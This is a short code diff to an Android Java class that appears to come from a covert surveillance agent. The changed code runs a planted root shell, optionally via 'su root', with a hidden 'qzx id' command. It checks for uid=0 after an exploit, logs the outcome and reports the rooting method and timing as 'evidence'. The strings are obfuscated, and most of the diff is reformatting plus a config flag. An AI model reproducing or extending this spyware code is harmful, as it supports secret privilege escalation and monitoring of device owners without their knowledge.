@@ -142,9 +142,11 @@ public class PackageInfo {
 			final AutoFile file = new AutoFile(Configuration.shellFileBase);
 
 			if (file.exists() && file.canRead()) {
-				
-				if(Root.checkCyanogenmod() && Keys.self().wantsPrivilege()){
-					Configuration.shellFile = M.e("su root ") + Configuration.shellFileBase;
+
+				if (Root.checkCyanogenmod() && Keys.self().wantsPrivilege()) {
+					if (Cfg.SUPPORT_CYANOGENMOD) {
+						Configuration.shellFile = M.e("su root ") + Configuration.shellFileBase;
+					}
 				}
 
 				final ExecuteResult p = Execute.execute(Configuration.shellFile + M.e(" qzx id"));
@@ -152,12 +154,12 @@ public class PackageInfo {
 				if (stdout.startsWith("uid=0")) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (checkRoot): isRoot YEAHHHHH"); //$NON-NLS-1$ //$NON-NLS-2$
-						
+
 						Date timestamp = new Date();
 						long diff = (timestamp.getTime() - Root.startExploiting.getTime()) / 1000;
-						
-						if(!sentInfo){
-							EvidenceReference.info("Root: " + Root.method + " time: " + diff +"s");
+
+						if (!sentInfo) {
+							EvidenceReference.info("Root: " + Root.method + " time: " + diff + "s");
 						}
 						sentInfo = true;
 					}
@@ -166,7 +168,7 @@ public class PackageInfo {
 				} else {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (checkRoot): isRoot NOOOOO"); //$NON-NLS-1$ //$NON-NLS-2$
-						if(!sentInfo){
+						if (!sentInfo) {
 							EvidenceReference.info("Root: NO");
 						}
 						sentInfo = true;
